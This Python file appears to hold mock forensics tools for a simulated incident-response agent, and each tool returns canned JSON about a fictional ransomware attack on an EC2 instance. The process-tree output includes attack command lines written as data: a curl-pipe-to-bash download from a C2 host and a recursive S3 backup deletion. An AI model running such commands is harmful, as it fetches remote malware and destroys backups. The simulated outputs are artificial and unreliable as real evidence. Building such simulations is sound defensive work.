"""Forensics and Investigation Tools for CyberSentinel agents.

Provides evidence collection, memory analysis, network capture,
and file integrity checking capabilities.
"""

import json
import random
from datetime import datetime, timedelta
from typing import Optional
from strands import tool


@tool
def capture_forensic_snapshot(instance_id: str, volumes: Optional[list] = None) -> str:
    """Create forensic EBS snapshots of an EC2 instance for evidence preservation.

    This captures the disk state before any remediation actions that might
    destroy evidence. Critical for incident response chain of custody.

    Args:
        instance_id: EC2 instance ID to snapshot (e.g., 'i-0abc123def456')
        volumes: Specific volume IDs to snapshot. If None, snapshots all attached volumes.
    """
    if volumes is None:
        volumes = ["vol-0aaa111", "vol-0bbb222"]
    snapshots = []
    for vol in volumes:
        snap_id = f"snap-forensic-{random.randint(100000, 999999)}"
        snapshots.append(
            {
                "snapshot_id": snap_id,
                "volume_id": vol,
                "status": "INITIATED",
                "size_gb": random.randint(50, 500),
                "encrypted": True,
                "tags": {
                    "Purpose": "forensic-evidence",
                    "IncidentId": "INC-2026-0042",
                    "CapturedBy": "CyberSentinel-ResponseAgent",
                    "ChainOfCustody": "automated-capture",
                },
            }
        )
    print(f"[FORENSICS] Capturing {len(snapshots)} snapshots from {instance_id}")
    return json.dumps(
        {
            "action": "FORENSIC_SNAPSHOT",
            "instance_id": instance_id,
            "snapshots": snapshots,
            "initiated_at": datetime.utcnow().isoformat() + "Z",
            "estimated_completion": (datetime.utcnow() + timedelta(minutes=15)).isoformat() + "Z",
            "chain_of_custody": "Snapshots tagged and encrypted. Access restricted to forensics IAM role.",
        },
        indent=2,
    )


@tool
def analyze_process_tree(instance_id: str, suspicious_pid: Optional[int] = None) -> str:
    """Retrieve and analyze the process tree from an EC2 instance.

    Shows parent-child relationships to trace how a malicious process was launched.

    Args:
        instance_id: EC2 instance to analyze
        suspicious_pid: Specific PID to trace (optional, shows full tree if omitted)
    """
    process_tree = {
        "instance_id": instance_id,
        "capture_time": datetime.utcnow().isoformat() + "Z",
        "tree": [
            {
                "pid": 1,
                "name": "systemd",
                "user": "root",
                "children": [
                    {
                        "pid": 842,
                        "name": "sshd",
                        "user": "root",
                        "children": [
                            {
                                "pid": 3201,
                                "name": "sshd",
                                "user": "deploy-svc",
                                "note": "SSH session from 45.155.205.33 (ATTACKER)",
                                "children": [
                                    {
                                        "pid": 3202,
                                        "name": "bash",
                                        "user": "deploy-svc",
                                        "children": [
                                            {
                                                "pid": 4100,
                                                "name": "curl",
                                                "user": "deploy-svc",
                                                "cmdline": "curl -s http://185.234.219.8/payload.sh | bash",
                                                "note": "MALWARE DOWNLOAD",
                                            },
                                            {
                                                "pid": 4200,
                                                "name": "bash",
                                                "user": "deploy-svc",
                                                "cmdline": "bash /tmp/.payload.sh",
                                                "note": "MALWARE EXECUTION",
                                                "children": [
                                                    {
                                                        "pid": 4821,
                                                        "name": "svchost32.exe",
                                                        "user": "deploy-svc",
                                                        "cmdline": "/tmp/.svchost32.exe --encrypt --ext .encrypted --threads 8",
                                                        "note": "RANSOMWARE PROCESS - ACTIVE",
                                                        "cpu_percent": 94.2,
                                                        "memory_mb": 312,
                                                    },
                                                ],
                                            },
                                            {
                                                "pid": 4300,
                                                "name": "aws",
                                                "user": "deploy-svc",
                                                "cmdline": "aws s3 rm s3://prod-backups/ --recursive",
                                                "note": "BACKUP DELETION",
                                            },
                                        ],
                                    },
                                ],
                            },
                        ],
                    },
                    {
                        "pid": 1200,
                        "name": "postgres",
                        "user": "postgres",
                        "note": "Database service - legitimate",
                    },
                ],
            },
        ],
        "summary": {
            "attack_chain": "SSH Login (deploy-svc) -> curl payload from C2 -> execute ransomware -> delete backups",
            "initial_access": "Compromised deploy-svc credentials via brute force",
            "malware_pid": 4821,
            "attacker_ip": "45.155.205.33",
            "c2_ip": "185.234.219.8",
        },
    }
    return json.dumps(process_tree, indent=2)


@tool
def check_file_integrity(instance_id: str, path: str = "/") -> str:
    """Check file integrity against known-good baselines to identify tampered or encrypted files.

    Args:
        instance_id: EC2 instance to check
        path: Directory path to scan (default: root '/')
    """
    return json.dumps(
        {
            "instance_id": instance_id,
            "scan_path": path,
            "scan_time": datetime.utcnow().isoformat() + "Z",
            "summary": {
                "total_files_scanned": 124847,
                "modified_files": 2341,
                "encrypted_files": 1847,
                "deleted_files": 23,
                "new_suspicious_files": 4,
            },
            "encrypted_directories": [
                {"path": "/var/lib/postgresql/data/", "encrypted_count": 1203, "total_size_gb": 45.2},
                {"path": "/home/deploy-svc/", "encrypted_count": 344, "total_size_gb": 2.1},
                {"path": "/opt/app/data/", "encrypted_count": 300, "total_size_gb": 8.7},
            ],
            "suspicious_new_files": [
                {"path": "/tmp/.svchost32.exe", "size": "2.3MB", "hash_md5": "a1b2c3d4e5f6789012345678abcdef01", "note": "Ransomware binary"},
                {"path": "/tmp/.payload.sh", "size": "4KB", "hash_md5": "deadbeef12345678abcdef0123456789", "note": "Dropper script"},
                {"path": "/tmp/README_DECRYPT.txt", "size": "1KB", "note": "Ransom note"},
                {"path": "/var/log/.hidden_key", "size": "256B", "note": "Possible encryption key fragment"},
            ],
            "ransom_note_content": "YOUR FILES HAVE BEEN ENCRYPTED. Send 5 BTC to bc1q... Contact: decrypt@proton.me",
        },
        indent=2,
    )


@tool
def analyze_network_connections(instance_id: str) -> str:
    """Capture and analyze current network connections from an instance.

    Shows all active TCP/UDP connections to identify C2 communication,
    data exfiltration, and lateral movement.

    Args:
        instance_id: EC2 instance to analyze
    """
    return json.dumps(
        {
            "instance_id": instance_id,
            "capture_time": datetime.utcnow().isoformat() + "Z",
            "connections": [
                {"proto": "tcp", "local": "10.0.1.50:5432", "remote": "10.0.1.100:48230", "state": "ESTABLISHED", "process": "postgres", "classification": "LEGITIMATE"},
                {"proto": "tcp", "local": "10.0.1.50:22", "remote": "45.155.205.33:52431", "state": "ESTABLISHED", "process": "sshd", "classification": "MALICIOUS - Attacker SSH session"},
                {"proto": "tcp", "local": "10.0.1.50:49832", "remote": "185.234.219.8:443", "state": "ESTABLISHED", "process": "svchost32.exe", "classification": "MALICIOUS - C2 communication"},
                {"proto": "tcp", "local": "10.0.1.50:49833", "remote": "185.234.219.8:8443", "state": "ESTABLISHED", "process": "svchost32.exe", "classification": "MALICIOUS - Data exfiltration channel"},
                {"proto": "tcp", "local": "10.0.1.50:443", "remote": "10.0.2.30:38291", "state": "ESTABLISHED", "process": "nginx", "classification": "LEGITIMATE"},
                {"proto": "udp", "local": "10.0.1.50:123", "remote": "169.254.169.123:123", "state": "N/A", "process": "chronyd", "classification": "LEGITIMATE - NTP"},
            ],
            "summary": {
                "total_connections": 6,
                "malicious": 3,
                "legitimate": 3,
                "c2_ips_detected": ["185.234.219.8"],
                "attacker_ips_detected": ["45.155.205.33"],
                "data_exfiltration_detected": True,
            },
        },
        indent=2,
    )


@tool
def collect_memory_artifacts(instance_id: str) -> str:
    """Collect volatile memory artifacts from an instance for malware analysis.

    Captures running processes, loaded modules, network state, and
    suspicious memory regions.

    Args:
        instance_id: EC2 instance to collect from
    """
    return json.dumps(
        {
            "instance_id": instance_id,
            "collection_time": datetime.utcnow().isoformat() + "Z",
            "memory_dump_size_gb": 16.0,
            "artifacts": {
                "suspicious_processes": [
                    {
                        "pid": 4821,
                        "name": "svchost32.exe",
                        "path": "/tmp/.svchost32.exe",
                        "hash_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                        "loaded_libraries": ["libcrypto.so.3", "libssl.so.3", "libpthread.so.0"],
                        "open_files": ["/var/lib/postgresql/data/*", "/tmp/.encryption_key"],
                        "network_sockets": ["185.234.219.8:443", "185.234.219.8:8443"],
                        "analysis": "ELF binary masquerading as Windows executable name. Uses OpenSSL for file encryption and C2 TLS communication.",
                    },
                ],
                "injected_code_regions": [
                    {"process": "bash (PID 3202)", "region": "0x7f4a12000000-0x7f4a12004000", "classification": "shellcode"},
                ],
                "encryption_keys_in_memory": [
                    {"type": "AES-256", "location": "PID 4821 heap", "note": "May be the file encryption key - preserve for potential decryption"},
                ],
            },
            "chain_of_custody": {
                "dump_hash_sha256": "abc123def456...",
                "stored_at": "s3://forensics-evidence/INC-2026-0042/memory/",
                "access_restricted_to": "arn:aws:iam::123456789012:role/forensics-analyst",
            },
        },
        indent=2,
    )


@tool
def generate_ioc_report(incident_id: str) -> str:
    """Generate a structured Indicators of Compromise (IOC) report for threat sharing.

    Produces a STIX-compatible IOC bundle for the incident.

    Args:
        incident_id: The incident ID to generate IOCs for
    """
    return json.dumps(
        {
            "incident_id": incident_id,
            "generated_at": datetime.utcnow().isoformat() + "Z",
            "format": "STIX 2.1",
            "iocs": {
                "network": [
                    {"type": "ipv4-addr", "value": "185.234.219.8", "context": "C2 server", "confidence": 95},
                    {"type": "ipv4-addr", "value": "45.155.205.33", "context": "Initial access / brute force origin", "confidence": 90},
                    {"type": "ipv4-addr", "value": "198.51.100.77", "context": "Reconnaissance / port scanning", "confidence": 75},
                    {"type": "domain", "value": "decrypt.proton.me", "context": "Ransom contact email domain", "confidence": 85},
                ],
                "file": [
                    {"type": "file", "name": "svchost32.exe", "md5": "a1b2c3d4e5f6789012345678abcdef01", "context": "Ransomware binary", "confidence": 100},
                    {"type": "file", "name": ".payload.sh", "md5": "deadbeef12345678abcdef0123456789", "context": "Dropper script", "confidence": 100},
                ],
                "behavior": [
                    {"type": "pattern", "value": "Mass file rename to .encrypted extension", "mitre": "T1486 - Data Encrypted for Impact"},
                    {"type": "pattern", "value": "Backup deletion via S3 API", "mitre": "T1490 - Inhibit System Recovery"},
                    {"type": "pattern", "value": "IAM user creation for persistence", "mitre": "T1136.003 - Create Account: Cloud Account"},
                ],
                "credentials": [
                    {"type": "username", "value": "deploy-svc", "context": "Compromised service account"},
                    {"type": "username", "value": "backup-admin", "context": "Attacker-created admin account"},
                ],
            },
            "mitre_attack_mapping": {
                "tactics": ["Initial Access", "Execution", "Persistence", "Privilege Escalation", "Credential Access", "Command and Control", "Impact"],
                "techniques": [
                    "T1110 - Brute Force",
                    "T1059.004 - Unix Shell",
                    "T1136.003 - Create Cloud Account",
                    "T1078 - Valid Accounts",
                    "T1552 - Unsecured Credentials",
                    "T1071 - Application Layer Protocol",
                    "T1573 - Encrypted Channel",
                    "T1486 - Data Encrypted for Impact",
                    "T1490 - Inhibit System Recovery",
                ],
            },
        },
        indent=2,
    )
